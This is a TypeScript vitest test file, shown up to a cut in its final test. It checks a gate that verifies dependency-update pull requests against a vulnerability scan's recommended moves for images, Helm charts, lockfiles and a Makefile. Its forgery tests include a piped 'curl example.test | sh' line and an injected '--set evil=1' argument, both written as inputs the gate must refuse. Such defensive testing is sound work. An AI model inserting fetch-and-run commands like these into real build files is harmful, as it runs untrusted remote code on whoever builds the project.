import { describe, expect, it } from 'vitest';
import type { Move as PinStepMove } from '../apps/runner/src/pins.ts';
import {
  type Changed,
  chartPinAt,
  exactText,
  hunkLines,
  type MoveIO,
  type MoveResult,
  proveMove,
  rawEntries,
  type ScanMove,
} from './move.ts';

// The scan's moves of a day and main's files, as the scratch copies had them (tests 1 to 5, 8a, 11 and 13 of patching),
// and the forgeries each must refuse (N3, N4, N5).

const digest = (c: string) => `sha256:${c.repeat(64)}`;
const D_OLD = digest('a');
const D_NEW = digest('b');
const D_OTHER = digest('c');

const FACTORY = 'the-roganator/cv-software-factory';
const APP = 'the-roganator/cv-worlds-worst-website';
const POSTGRES = 'deploy/base/postgres/statefulset.yaml';
const PROMETHEUS = 'deploy/base/telemetry/prometheus.yaml';
const OTEL = 'deploy/base/telemetry/otel-collector.yaml';
const POD_LOGS = 'deploy/base/pod-logs/pod-logs.yaml';
const LOKI = 'deploy/base/telemetry/loki.yaml';
const KYVERNO = 'deploy/base/kyverno/values.yaml';
const LOCK = 'pnpm-lock.yaml';

const application = (chart: string, version: string) =>
  [
    'apiVersion: argoproj.io/v1alpha1',
    'kind: Application',
    'spec:',
    '  source:',
    `      chart: ${chart}`,
    `      targetRevision: ${version}`,
    '',
  ].join('\n');

const lockfile = (grpc: string, protobuf: string) =>
  [
    "lockfileVersion: '9.0'",
    'packages:',
    `  '@grpc/grpc-js@${grpc}':`,
    '    resolution: {integrity: sha512-a}',
    `  protobufjs@${protobuf}:`,
    '    resolution: {integrity: sha512-b}',
    '',
  ].join('\n');

const MAIN: Record<string, string> = {
  [POSTGRES]: [
    'spec:',
    '  containers:',
    `          image: postgres:18.6-alpine3.24@${D_OLD}`,
    '          name: postgres',
    '',
  ].join('\n'),
  [PROMETHEUS]: application('prometheus', '29.35.0'),
  [OTEL]: application('opentelemetry-collector', '0.174.0'),
  [POD_LOGS]: application('opentelemetry-collector', '0.174.0'),
  [LOKI]: application('loki', '18.13.7'),
  [KYVERNO]: [
    'admissionController:',
    `  image: reg.kyverno.io/kyverno/kyverno:v1.19.1@${D_OLD}`,
    'backgroundController:',
    `  image: reg.kyverno.io/kyverno/background-controller:v1.19.1@${D_OLD}`,
    '',
  ].join('\n'),
  [LOCK]: lockfile('1.14.5', '7.6.5'),
  'package.json': '{ "dependencies": { "@grpc/grpc-js": "^1.14.5" } }\n',
};

const counts = (critical = 0) => ({ CRITICAL: critical, HIGH: 1, MEDIUM: 0, LOW: 0, UNKNOWN: 0 });
/** A finding a move clears as the state gives it: Trivy's rating (`severity`) and its type of the result. */
const critical = (trivy: 'CRITICAL' | 'HIGH' = 'CRITICAL', type = 'helm'): ScanMove['findings'][number] => ({
  advisory: 'CVE-2026-0001',
  severity: trivy,
  type,
  package: 'loki',
  installed: '18.13.7',
  file: LOKI,
  line: 6,
  fix: 'chart loki 21.2.3 (a major)',
  firstSeen: '2026-11-10T06:00:00Z',
});
let index = 0;
/** One of the scan's moves, as the worker's read gives it. */
const move = (over: Partial<ScanMove>): ScanMove => ({
  repository: FACTORY,
  name: '',
  pins: [],
  from: '',
  to: '',
  major: false,
  clears: counts(),
  leaves: counts(),
  newToday: 0,
  lane: 'worker',
  lockfile: false,
  index: ++index,
  findings: [],
  ...over,
});
/** A lockfile's move: public by its file alone, its package and versions in what the state gives. */
const packageMove = (name: string, from: string, to: string, line: number, critical = 0): ScanMove =>
  move({
    repository: APP,
    name: `a package in \`${LOCK}\``,
    pins: [{ file: LOCK, line: 0 }],
    lockfile: true,
    lane: 'line',
    clears: counts(critical),
    withheld: { package: name, from, to: `version ${to}`, pins: [{ file: LOCK, line }] },
  });

const SCAN: ScanMove[] = [
  move({
    name: 'postgres',
    pins: [{ file: POSTGRES, line: 3 }],
    from: '18.6-alpine3.24',
    to: `image 18.7-alpine3.24@${D_NEW}`,
  }),
  move({ name: 'prometheus', pins: [{ file: PROMETHEUS, line: 6 }], from: '29.35.0', to: 'chart prometheus 29.47.2' }),
  move({
    name: 'opentelemetry-collector',
    pins: [
      { file: POD_LOGS, line: 6 },
      { file: OTEL, line: 6 },
    ],
    from: '0.174.0',
    to: 'chart opentelemetry-collector 0.178.3',
  }),
  move({
    name: 'loki',
    pins: [{ file: LOKI, line: 6 }],
    from: '18.13.7',
    to: 'chart loki 21.2.3 (a major)',
    major: true,
  }),
  move({
    name: 'reg.kyverno.io/kyverno/kyverno',
    pins: [{ file: KYVERNO, line: 2 }],
    from: 'v1.19.1',
    to: `image v1.20.0@${D_NEW}`,
  }),
  move({
    name: 'reg.kyverno.io/kyverno/background-controller',
    pins: [{ file: KYVERNO, line: 4 }],
    from: 'v1.19.1',
    to: `image v1.20.0@${D_NEW}`,
  }),
];
const APP_SCAN: ScanMove[] = [
  packageMove('@grpc/grpc-js', '1.14.5', '1.14.7', 3),
  packageMove('protobufjs', '7.6.5', '7.6.6', 5, 1),
];

/** The pin step, as the line runs it: each package to its version in the lockfile, and grpc's range in package.json. */
const step =
  (asked: PinStepMove[][] = []): MoveIO['derive'] =>
  async (moves) => {
    asked.push([...moves]);
    let lock = MAIN[LOCK] as string;
    let manifest: string | undefined;
    for (const each of moves) {
      lock = lock.replace(`${each.name}@${each.from}`, `${each.name}@${each.to}`);
      if (each.name === '@grpc/grpc-js') manifest = (MAIN['package.json'] as string).replace(each.from, each.to);
    }
    return new Map([[LOCK, lock], ...(manifest ? [['package.json', manifest] as [string, string]] : [])]);
  };

/** A change: each file's text on main and at the merge, modified in place unless said. */
function change(heads: Record<string, string>, extra: Partial<Changed>[] = []): Changed[] {
  return [
    ...Object.entries(heads).map(([path, head]) => ({
      path,
      status: 'M',
      modes: ['100644', '100644'] as [string, string],
      base: MAIN[path] ?? '',
      head,
    })),
    ...extra.map((each) => ({ path: '', status: 'M', modes: ['100644', '100644'] as [string, string], ...each })),
  ];
}

const modified = (path: string, base: string, head: string): Changed => ({
  path,
  status: 'M',
  modes: ['100644', '100644'],
  base,
  head,
});
const io = (derive = step()): MoveIO => ({ base: (path) => MAIN[path], derive });
const prove = (changed: Changed[], scan: ScanMove[] = SCAN): Promise<MoveResult> =>
  proveMove(changed, scan, io(), false);
const proveApp = (changed: Changed[], derive = step(), scan = APP_SCAN) => proveMove(changed, scan, io(derive), true);
const swap = (path: string, from: string, to: string) => (MAIN[path] as string).replace(from, to);
const reasonOf = (result: MoveResult) =>
  'reason' in result ? result.reason : 'none' in result ? result.none : `passed as ${result.rule}`;

describe('a move: the scan’s moves, made by the gate on main, the same as the pull request', () => {
  it('passes a third-party image under deploy/ (test 1)', async () => {
    const result = await prove(
      change({ [POSTGRES]: swap(POSTGRES, `18.6-alpine3.24@${D_OLD}`, `18.7-alpine3.24@${D_NEW}`) }),
    );
    expect(result).toEqual({ rule: 'move', title: expect.stringContaining('postgres to 18.7-alpine3.24') });
  });

  it('passes a chart within its major, whatever its rendering (test 2)', async () => {
    expect(await prove(change({ [PROMETHEUS]: swap(PROMETHEUS, '29.35.0', '29.47.2') }))).toMatchObject({
      rule: 'move',
    });
  });

  it('passes one chart at two Applications, both moved (test 3)', async () => {
    const moved = { [OTEL]: swap(OTEL, '0.174.0', '0.178.3'), [POD_LOGS]: swap(POD_LOGS, '0.174.0', '0.178.3') };
    expect(await prove(change(moved))).toMatchObject({ rule: 'move' });
  });

  it('names a major that clears no Critical `major` (test 4), and one that clears a Critical `move`', async () => {
    const moved = change({ [LOKI]: swap(LOKI, '18.13.7', '21.2.3') });
    expect(await prove(moved)).toMatchObject({
      rule: 'major',
      title: expect.stringContaining('a major that clears no Critical by Trivy’s rating: loki'),
    });
    const clearing = SCAN.map((m) => (m.name === 'loki' ? { ...m, clears: counts(1), findings: [critical()] } : m));
    expect(await prove(moved, clearing)).toMatchObject({ rule: 'move' });
  });

  it('names a major `major` when its only Critical is its publisher’s, or Node’s own', async () => {
    const moved = change({ [LOKI]: swap(LOKI, '18.13.7', '21.2.3') });
    // The move counts a Critical, by the publisher's rating; Trivy rated the finding High.
    const published = SCAN.map((m) =>
      m.name === 'loki' ? { ...m, clears: counts(1), findings: [critical('HIGH')] } : m,
    );
    expect(await prove(moved, published)).toMatchObject({ rule: 'major' });
    const nodes = SCAN.map((m) =>
      m.name === 'loki' ? { ...m, clears: counts(1), findings: [critical('CRITICAL', 'node')] } : m,
    );
    expect(await prove(moved, nodes)).toMatchObject({ rule: 'major' });
  });

  it('passes several of the day’s moves in one pull request, Kyverno’s own among them (test 5)', async () => {
    const kyverno = (MAIN[KYVERNO] as string).replaceAll(`v1.19.1@${D_OLD}`, `v1.20.0@${D_NEW}`);
    const result = await prove(change({ [KYVERNO]: kyverno, [PROMETHEUS]: swap(PROMETHEUS, '29.35.0', '29.47.2') }));
    expect(result).toMatchObject({ rule: 'move', title: expect.stringContaining('3 moves') });
  });

  it('is `major` when any move it carries is a major that clears no Critical', async () => {
    const result = await prove(
      change({ [LOKI]: swap(LOKI, '18.13.7', '21.2.3'), [PROMETHEUS]: swap(PROMETHEUS, '29.35.0', '29.47.2') }),
    );
    expect(result).toMatchObject({ rule: 'major' });
  });
});

describe('a routine update: a move no finding asks for, made and compared as any other', () => {
  const NONE = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, UNKNOWN: 0 };
  /** The day with Kyverno's background controller merely behind, its admission controller's move a finding's still. */
  const day = SCAN.map((m) =>
    m.name === 'reg.kyverno.io/kyverno/background-controller' ? { ...m, clears: NONE, leaves: NONE } : m,
  );
  const line = (text: string, at: number, to: string) =>
    text
      .split('\n')
      .map((each, i) => (i === at - 1 ? each.replace(`v1.19.1@${D_OLD}`, to) : each))
      .join('\n');
  const kyverno = MAIN[KYVERNO] as string;

  it('passes the pull request of a file’s routine updates while its fix is in another, and the fix’s while they are', async () => {
    const routine = await prove(change({ [KYVERNO]: line(kyverno, 4, `v1.20.0@${D_NEW}`) }), day);
    expect(routine).toEqual({
      rule: 'move',
      title:
        'The scan’s move of reg.kyverno.io/kyverno/background-controller to v1.20.0, made by the gate on main and the same as the pull request',
    });
    const fix = await prove(change({ [KYVERNO]: line(kyverno, 2, `v1.20.0@${D_NEW}`) }), day);
    expect(fix).toMatchObject({
      rule: 'move',
      title: expect.stringContaining('move of reg.kyverno.io/kyverno/kyverno'),
    });
    // Once one has merged, the other is the same move on main as it is then.
    const merged = line(kyverno, 2, `v1.20.0@${D_NEW}`);
    const after = [modified(KYVERNO, merged, line(merged, 4, `v1.20.0@${D_NEW}`))];
    expect(await proveMove(after, day, { ...io(), base: (path) => (path === KYVERNO ? merged : MAIN[path]) }, false))
      // The fix's pin is no longer the line the scan read, and is carried by nothing: the routine update alone.
      .toMatchObject({ rule: 'move', title: expect.stringContaining('move of reg.kyverno.io/kyverno/background') });
  });

  it('holds a routine update to the scan’s target and to its pins, as it holds a fix', async () => {
    expect(reasonOf(await prove(change({ [KYVERNO]: line(kyverno, 4, `v1.20.1@${D_NEW}`) }), day))).toMatch(
      /deploy\/base\/kyverno\/values\.yaml:4 is .* where the scan's moves make/,
    );
    expect(reasonOf(await prove(change({ [KYVERNO]: line(kyverno, 4, `v1.20.0@${D_OTHER}`) }), day))).toMatch(
      /where the scan's moves make/,
    );
    // A pull request that rewrites a pin of each carries both, and must make both as the scan does.
    const both = kyverno.replaceAll(`v1.19.1@${D_OLD}`, `v1.20.0@${D_NEW}`);
    expect(await prove(change({ [KYVERNO]: both }), day)).toMatchObject({
      rule: 'move',
      title: expect.stringContaining('2 moves'),
    });
    const half = line(line(kyverno, 2, `v1.20.0@${D_NEW}`), 4, `v1.19.9@${D_NEW}`);
    expect(reasonOf(await prove(change({ [KYVERNO]: half }), day))).toMatch(/values\.yaml:4 is/);
  });

  it('names a routine update across a major `major`: it clears no Critical, as it clears nothing', async () => {
    const behind = SCAN.map((m) => (m.name === 'loki' ? { ...m, clears: NONE } : m));
    const result = await prove(change({ [LOKI]: swap(LOKI, '18.13.7', '21.2.3') }), behind);
    // Its title says what it is, in place of a rating of findings it does not have.
    expect(result).toEqual({
      rule: 'major',
      title:
        'The scan’s move of loki to 21.2.3, made by the gate on main and the same as the pull request; a routine update across a major, with no finding behind it: loki',
    });
    // Beside a finding's major in one pull request, each is named for what it is.
    const two = [
      ...behind,
      move({
        name: 'tempo',
        pins: [{ file: PROMETHEUS, line: 6 }],
        from: '29.35.0',
        to: 'chart prometheus 30.0.0 (a major)',
        major: true,
      }),
    ].filter((m) => m.name !== 'prometheus');
    const both = await prove(
      change({ [LOKI]: swap(LOKI, '18.13.7', '21.2.3'), [PROMETHEUS]: swap(PROMETHEUS, '29.35.0', '30.0.0') }),
      two,
    );
    expect(both).toMatchObject({
      rule: 'major',
      title: expect.stringContaining(
        '; a major that clears no Critical by Trivy’s rating: tempo; a routine update across a major, with no finding behind it: loki',
      ),
    });
  });

  it('passes a routine update of the app’s lockfile, its package from the state’s record, made by the pin step', async () => {
    const routine: ScanMove = { ...packageMove('@grpc/grpc-js', '1.14.5', '1.14.7', 3), clears: NONE, leaves: NONE };
    const scan = [routine, APP_SCAN[1] as ScanMove];
    const asked: PinStepMove[][] = [];
    const result = await proveApp(
      change({ [LOCK]: lockfile('1.14.7', '7.6.5'), 'package.json': swap('package.json', '1.14.5', '1.14.7') }),
      step(asked),
      scan,
    );
    expect(result).toEqual({
      rule: 'move',
      title:
        'The scan’s move of a package in `pnpm-lock.yaml`, made by the gate on main and the same as the pull request',
    });
    // Asked as the line's pin step is: a routine update, held to exactly its target.
    expect(asked).toEqual([[{ ecosystem: 'npm', name: '@grpc/grpc-js', from: '1.14.5', to: '1.14.7', routine: true }]]);
    // A fix of the same package is asked for with its target a floor, as it is made.
    const fixes: PinStepMove[][] = [];
    await proveApp(change({ [LOCK]: lockfile('1.14.7', '7.6.5') }), step(fixes));
    expect(fixes).toEqual([[{ ecosystem: 'npm', name: '@grpc/grpc-js', from: '1.14.5', to: '1.14.7' }]]);
  });
});

describe('a routine update of a package whose old entry a parent keeps', () => {
  const NONE = { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, UNKNOWN: 0 };
  /** A lockfile that resolves zod for the manifest, and for `holder`, which pins it at 4.2.0 exactly. */
  const lock = (direct: string) =>
    [
      "lockfileVersion: '9.0'",
      'importers:',
      '  .:',
      '    dependencies:',
      '      zod:',
      `        specifier: ^${direct}`,
      `        version: ${direct}`,
      'packages:',
      '  holder@1.0.0:',
      '    resolution: {integrity: sha512-h}',
      '  zod@4.2.0:',
      '    resolution: {integrity: sha512-z4}',
      ...(direct === '4.2.0' ? [] : [`  zod@${direct}:`, '    resolution: {integrity: sha512-z5}']),
      'snapshots:',
      '  holder@1.0.0:',
      '    dependencies:',
      '      zod: 4.2.0',
      '',
    ].join('\n');
  const [BASE, MOVED] = [lock('4.2.0'), lock('5.1.0')];
  const manifest = (range: string) => `{ "dependencies": { "holder": "^1.0.0", "zod": "${range}" } }\n`;
  /** The scan's move: pinned at the package's entry, line 11, which the lockfile keeps for `holder`. */
  const zod: ScanMove = {
    ...packageMove('zod', '4.2.0', '5.1.0', 11),
    major: true,
    clears: NONE,
    leaves: NONE,
  };
  /** The change as git gives it: the importer's two lines rewritten, and the new entry inserted after the old one's. */
  const changed = (head = MOVED): Changed[] => [
    { ...modified(LOCK, BASE, head), rewrites: [6, 7, 12] },
    modified('package.json', manifest('^4.2.0'), manifest('^5.1.0')),
  ];
  const made = (asked: PinStepMove[][] = []): MoveIO => ({
    base: (path) => (path === LOCK ? BASE : path === 'package.json' ? manifest('^4.2.0') : undefined),
    derive: async (moves) => {
      asked.push([...moves]);
      return new Map([
        [LOCK, MOVED],
        ['package.json', manifest('^5.1.0')],
      ]);
    },
  });

  it('is carried by the change that rewrites where main’s lockfile resolves it for the manifest, and passes as made', async () => {
    expect(BASE.split('\n')[10]).toBe('  zod@4.2.0:');
    expect(MOVED.split('\n')[10]).toBe('  zod@4.2.0:');
    const asked: PinStepMove[][] = [];
    expect(await proveMove(changed(), [zod], made(asked), true)).toEqual({
      rule: 'major',
      title: expect.stringContaining('a routine update across a major, with no finding behind it'),
    });
    expect(asked).toEqual([[{ ecosystem: 'npm', name: 'zod', from: '4.2.0', to: '5.1.0', routine: true }]]);
    // Held to the step's bytes as any move: the manifest's copy at another version is refused, by its line alone.
    const other = await proveMove(changed(MOVED.replaceAll('5.1.0', '5.1.1')), [zod], made(), true);
    expect(other).toEqual({ reason: 'pnpm-lock.yaml:6 is not what the pin step writes for the moves it carries' });
  });

  it('carries no fix by that line: a fix’s entry always moves, and a change that leaves it is no move of it', async () => {
    const fix: ScanMove = { ...zod, clears: counts() };
    expect(await proveMove(changed(), [fix], made(), true)).toHaveProperty('none');
    // A change that rewrites the importer of another package carries no move of this one.
    const elsewhere: Changed[] = [{ ...modified(LOCK, BASE, BASE.replace('sha512-h', 'sha512-i')), rewrites: [10] }];
    expect(await proveMove(elsewhere, [zod], made(), true)).toHaveProperty('none');
  });
});

describe('the Makefile’s pin of Argo CD’s chart, which the App writes', () => {
  const MAKEFILE = ['CLUSTER := software-factory', 'ARGOCD_CHART := 10.15.0', 'up:', '\thelm upgrade argocd', ''].join(
    '\n',
  );
  const chart = move({
    name: 'argo-cd',
    pins: [{ file: 'Makefile', line: 2 }],
    from: '10.15.0',
    to: 'chart argo-cd 10.16.2',
  });
  const proveMakefile = (head: string) =>
    proveMove(
      [modified('Makefile', MAKEFILE, head)],
      [...SCAN, chart],
      { ...io(), base: (path) => (path === 'Makefile' ? MAKEFILE : MAIN[path]) },
      false,
    );

  it('passes the chart’s version moved to the scan’s target, and nothing else of the Makefile', async () => {
    expect(await proveMakefile(MAKEFILE.replace('10.15.0', '10.16.2'))).toEqual({
      rule: 'move',
      title: 'The scan’s move of argo-cd to 10.16.2, made by the gate on main and the same as the pull request',
    });
  });

  it('refuses a second changed line of the Makefile, and the chart moved to any other version', async () => {
    const moved = MAKEFILE.replace('10.15.0', '10.16.2');
    expect(
      reasonOf(await proveMakefile(moved.replace('helm upgrade argocd', 'helm upgrade argocd --set evil=1'))),
    ).toBe("Makefile:4 is `helm upgrade argocd --set evil=1` where the scan's moves make `helm upgrade argocd`");
    expect(reasonOf(await proveMakefile(`${moved}also:\n\tcurl example.test | sh\n`))).toMatch(/^Makefile:5 is /);
    expect(reasonOf(await proveMakefile(moved.replace('software-factory', 'another')))).toMatch(/^Makefile:1 is /);
    expect(reasonOf(await proveMakefile(MAKEFILE.replace('10.15.0', '10.16.3')))).toBe(
      "Makefile:2 is `ARGOCD_CHART := 10.16.3` where the scan's moves make `ARGOCD_CHART := 10.16.2`",
    );
    // A change to the Makefile that rewrites no pin is no move at all.
    expect(await proveMakefile(MAKEFILE.replace('software-factory', 'another'))).toHaveProperty('none');
  });
});

describe('a lockfile’s move, made by the line’s pin step on main (tests 8a and 13)', () => {
  const grpc = { [LOCK]: lockfile('1.14.7', '7.6.5'), 'package.json': swap('package.json', '1.14.5', '1.14.7') };

  it('passes the pin step’s own bytes, a Critical’s fix among them, named as the public list names it', async () => {
    const asked: PinStepMove[][] = [];
    const result = await proveApp(change(grpc), step(asked));
    expect(result).toEqual({
      rule: 'move',
      title:
        'The scan’s move of a package in `pnpm-lock.yaml`, made by the gate on main and the same as the pull request',
    });
    // Only the move whose line it rewrites: the other package's stays where it is.
    expect(asked).toEqual([[{ ecosystem: 'npm', name: '@grpc/grpc-js', from: '1.14.5', to: '1.14.7' }]]);
    expect(await proveApp(change({ [LOCK]: lockfile('1.14.5', '7.6.6') }))).toMatchObject({ rule: 'move' });
  });

  it('refuses any other bytes, and never says the package or version the scan withholds', async () => {
    for (const forged of [
      { ...grpc, [LOCK]: lockfile('1.14.8', '7.6.5') },
      { [LOCK]: grpc[LOCK] },
      { ...grpc, 'package.json': '{ "dependencies": { "@grpc/grpc-js": "1.14.7" } }\n' },
    ]) {
      const reason = reasonOf(await proveApp(change(forged)));
      expect(reason).toMatch(/is not what the pin step writes for the moves it carries|leaves package\.json unmoved/);
      expect(reason).not.toMatch(/grpc|protobuf|1\.14/);
    }
  });

  it('passes the lockfile alone where an image of ours carries the package too, as app #56 did (test 13)', async () => {
    // The scan pins protobufjs at the lockfile and at the app's own image, which a deploy moves after the merge.
    const image = 'deploy/images/ours.yaml';
    const both = move({
      ...packageMove('protobufjs', '7.6.5', '7.6.6', 5, 1),
      name: `a package in \`${image}\` and \`${LOCK}\``,
      pins: [
        { file: image, line: 0 },
        { file: LOCK, line: 0 },
      ],
      withheld: {
        package: 'protobufjs',
        from: '7.6.5',
        to: 'version 7.6.6',
        pins: [
          { file: image, line: 2 },
          { file: LOCK, line: 5 },
        ],
      },
    });
    const asked: PinStepMove[][] = [];
    const lock = change({ [LOCK]: lockfile('1.14.5', '7.6.6') });
    expect(await proveApp(lock, step(asked), [both])).toMatchObject({ rule: 'move' });
    expect(asked).toEqual([[{ ecosystem: 'npm', name: 'protobufjs', from: '7.6.5', to: '7.6.6' }]]);
    // A deploy pin of that image carries no lockfile's move: the pin step never runs for it.
    asked.length = 0;
    const deploy = [modified(image, `a\n- digest: ${D_OLD}\n`, `a\n- digest: ${D_NEW}\n`)];
    expect(await proveApp(deploy, step(asked), [both])).toMatchObject({ none: expect.any(String) });
    expect(asked).toEqual([]);
  });

  it('counts no move carried by a pin at no line: a major riding apart stays out of the others’ proof', async () => {
    // The scan found the major's package at no line of the lockfile; the pull request makes the other move alone.
    const major = move({ ...packageMove('protobufjs', '7.6.5', '8.0.0', 0), major: true });
    const scan = [packageMove('@grpc/grpc-js', '1.14.5', '1.14.7', 3), major];
    const asked: PinStepMove[][] = [];
    expect(await proveApp(change(grpc), step(asked), scan)).toMatchObject({ rule: 'move' });
    expect(asked).toEqual([[{ ecosystem: 'npm', name: '@grpc/grpc-js', from: '1.14.5', to: '1.14.7' }]]);
    // Nor is it carried alone: the pull request that makes it is no move the gate can place.
    const alone = await proveApp(change({ [LOCK]: lockfile('1.14.5', '8.0.0') }), step(), [major]);
    expect(alone).toMatchObject({ none: expect.any(String) });
  });

  it('says only that the pin step failed, never its words, which may name the package', async () => {
    const failing: MoveIO['derive'] = async () => {
      throw new Error('@grpc/grpc-js@1.14.7 is younger than minimumReleaseAge');
    };
    expect(reasonOf(await proveApp(change(grpc), failing))).toBe(
      'the pin step could not make a package in `pnpm-lock.yaml` on main',
    );
  });

  describe('Node in the app, with the images that run it (tests 10 and 11)', () => {
    const runtime = 'gcr.io/distroless/nodejs24-debian13';
    const dockerfile = [
      `FROM node:24.22.0-alpine3.24@${D_OLD} AS build`,
      'RUN pnpm build',
      `FROM ${runtime}:nonroot@${D_OLD}`,
      '',
    ].join('\n');
    const lock = '[[tools.node]]\nversion = "24.22.0"\nchecksum = "sha256:0"\n';
    const files: Record<string, string> = {
      Dockerfile: dockerfile,
      'mise.toml': 'node = "24.22.0"\n',
      'mise.lock': lock,
    };
    const node = move({
      repository: APP,
      name: 'node',
      lane: 'line',
      pins: [{ file: 'Dockerfile', line: 1 }],
      from: '24.22.0-alpine3.24',
      to: `image 24.22.3-alpine3.24@${D_NEW}`,
    });
    const distroless = move({
      repository: APP,
      name: runtime,
      lane: 'line',
      pins: [{ file: 'Dockerfile', line: 3 }],
      from: 'nonroot',
      to: `image nonroot@${D_NEW}`,
    });
    /**
     * The pin step on main's files, as apps/runner/src/pins.ts writes them: Node's move re-pins each image of Node at
     * its tag as the registry has it now (`now`); the runtime's pins it at the move's digest, and brings the Node that
     * digest runs, 24.22.3, where mise.toml pins another.
     */
    const derive =
      (asked: PinStepMove[][], now: string): MoveIO['derive'] =>
      async (moves) => {
        asked.push([...moves]);
        const text = new Map(Object.entries(files));
        const toNode = () => {
          if (text.get('mise.toml') === 'node = "24.22.3"\n') return;
          text.set('mise.toml', 'node = "24.22.3"\n');
          text.set('mise.lock', lock.replace('24.22.0', '24.22.3').replace('sha256:0', 'sha256:3'));
          text.set(
            'Dockerfile',
            (text.get('Dockerfile') as string)
              .replace(`24.22.0-alpine3.24@${D_OLD}`, `24.22.3-alpine3.24@${D_NEW}`)
              .replace(/nonroot@sha256:\w+/, `nonroot@${now}`),
          );
        };
        for (const each of moves) {
          toNode();
          if (each.ecosystem === 'docker')
            text.set('Dockerfile', (text.get('Dockerfile') as string).replace(/nonroot@sha256:\w+/, each.to));
        }
        return new Map([...text].filter(([path, body]) => body !== files[path]));
      };
    const head = dockerfile
      .replace(`24.22.0-alpine3.24@${D_OLD}`, `24.22.3-alpine3.24@${D_NEW}`)
      .replace(`nonroot@${D_OLD}`, `nonroot@${D_NEW}`);
    const changed = [
      modified('Dockerfile', dockerfile, head),
      modified('mise.toml', files['mise.toml'] as string, 'node = "24.22.3"\n'),
      modified('mise.lock', lock, lock.replace('24.22.0', '24.22.3').replace('sha256:0', 'sha256:3')),
    ];
    const read = (asked: PinStepMove[][], now = D_NEW) => ({
      base: (path: string) => files[path],
      derive: derive(asked, now),
    });

    it('passes Node’s move with the runtime image’s on the same Dockerfile, as app #82 did (test 11)', async () => {
      const asked: PinStepMove[][] = [];
      expect(await proveMove(changed, [node, distroless], read(asked), true)).toMatchObject({
        rule: 'move',
        title: expect.stringContaining('2 moves'),
      });
      expect(asked).toEqual([
        [
          { ecosystem: 'node', name: 'node', from: '24.22.0', to: '24.22.3' },
          { ecosystem: 'docker', name: runtime, from: 'nonroot', to: `nonroot@${D_NEW}` },
        ],
      ]);
      // The runtime at the digest the scan read, whatever the registry's tag says now: its own move pins it.
      expect(await proveMove(changed, [node, distroless], read([], D_OTHER), true)).toMatchObject({ rule: 'move' });
      const other = [
        { ...changed[0], head: head.replace(`nonroot@${D_NEW}`, `nonroot@${D_OTHER}`) } as Changed,
        ...changed.slice(1),
      ];
      expect(reasonOf(await proveMove(other, [node, distroless], read([], D_OTHER), true))).toContain(
        'Dockerfile:3 is',
      );
      // Its Node left behind: mise.toml is the pin step's too.
      expect(reasonOf(await proveMove([changed[0] as Changed], [node, distroless], read([]), true))).toBe(
        'it leaves mise.toml unmoved, which the moves it carries write',
      );
    });

    it('passes the runtime image’s move with the Node it brings, the line’s one ticket, as app #79 should have been (test 10)', async () => {
      // The same bytes as Node's own move: the gate makes them from the runtime's move, whichever of the day's moves
      // the scan lists beside it.
      for (const scan of [[distroless], [node, distroless]]) {
        const asked: PinStepMove[][] = [];
        expect(await proveMove(changed, scan, read(asked), true)).toMatchObject({ rule: 'move' });
        expect(asked.flat()).toContainEqual({
          ecosystem: 'docker',
          name: runtime,
          from: 'nonroot',
          to: `nonroot@${D_NEW}`,
        });
      }
      // The runtime's line alone, its Node left behind, is what failed `image builds`: not the move.
      const alone = [modified('Dockerfile', dockerfile, dockerfile.replace(`nonroot@${D_OLD}`, `nonroot@${D_NEW}`))];
      expect(reasonOf(await proveMove(alone, [distroless], read([]), true))).toBe(
        `Dockerfile:1 is \`FROM node:24.22.0-alpine3.24@${D_OLD} AS build\` where the scan's moves make \`FROM node:24.22.3-alpine3.24@${D_NEW} AS build\``,
      );
    });
  });
});

describe('an image that brings another pin, made by the pin step on main (tests 6 and 12)', () => {
  it('passes Playwright’s image with its library, made by the step as the scan made it (test 6)', async () => {
    const browser = 'apps/factory/Dockerfile.browser';
    const playwright = 'mcr.microsoft.com/playwright';
    const files: Record<string, string> = {
      [browser]: `FROM node:24.22.2-trixie-slim@${D_OLD} AS node\nFROM ${playwright}:v1.65.0-noble@${D_OLD} AS browsers\n`,
      [LOCK]: "lockfileVersion: '9.0'\npackages:\n  playwright@1.65.0:\n    resolution: {integrity: sha512-a}\n",
      'apps/factory/package.json': '{ "dependencies": { "playwright": "^1.65.0" } }\n',
    };
    const moved: Record<string, string> = {
      [browser]: (files[browser] as string).replace(`v1.65.0-noble@${D_OLD}`, `v1.65.1-noble@${D_NEW}`),
      [LOCK]: (files[LOCK] as string).replace('1.65.0', '1.65.1'),
      'apps/factory/package.json': (files['apps/factory/package.json'] as string).replace('1.65.0', '1.65.1'),
    };
    const image = move({
      name: playwright,
      pins: [{ file: browser, line: 2 }],
      from: 'v1.65.0-noble',
      to: `image v1.65.1-noble@${D_NEW}`,
    });
    const asked: PinStepMove[][] = [];
    const read: MoveIO = {
      base: (path) => files[path],
      derive: async (moves) => {
        asked.push([...moves]);
        return new Map(Object.entries(moved));
      },
    };
    const whole = Object.entries(moved).map(([path, head]) => modified(path, files[path] as string, head));
    expect(await proveMove(whole, [image], read, false)).toMatchObject({ rule: 'move' });
    expect(asked).toEqual([
      [{ ecosystem: 'docker', name: playwright, from: 'v1.65.0-noble', to: `v1.65.1-noble@${D_NEW}` }],
    ]);
    // The image's FROM alone, as Dependabot's pull request moves it without its library: not the move.
    expect(reasonOf(await proveMove([whole[0] as Changed], [image], read, false))).toMatch(/^it leaves .* unmoved/);
  });

  it('passes the app’s Syft under deploy/ as an edit of its FROM, as one at the root is (test 12)', async () => {
    const syft = 'deploy/images/syft/Dockerfile';
    const base = `# Syft's one pin.\nFROM ghcr.io/anchore/syft:v1.54.0@${D_OLD}\n`;
    const scan = [
      move({
        repository: APP,
        lane: 'line',
        name: 'ghcr.io/anchore/syft',
        pins: [{ file: syft, line: 2 }],
        from: 'v1.54.0',
        to: `image v1.57.2@${D_NEW}`,
      }),
    ];
    const asked: PinStepMove[][] = [];
    const read: MoveIO = { base: (path) => (path === syft ? base : undefined), derive: step(asked) };
    const head = base.replace(`v1.54.0@${D_OLD}`, `v1.57.2@${D_NEW}`);
    expect(await proveMove([modified(syft, base, head)], scan, read, true)).toMatchObject({ rule: 'move' });
    expect(asked).toEqual([]);
  });
});

describe('what is not a move, and says what differs', () => {
  it('refuses a move backward, or to another version than the scan’s (N3)', async () => {
    expect(reasonOf(await prove(change({ [PROMETHEUS]: swap(PROMETHEUS, '29.35.0', '29.30.0') })))).toBe(
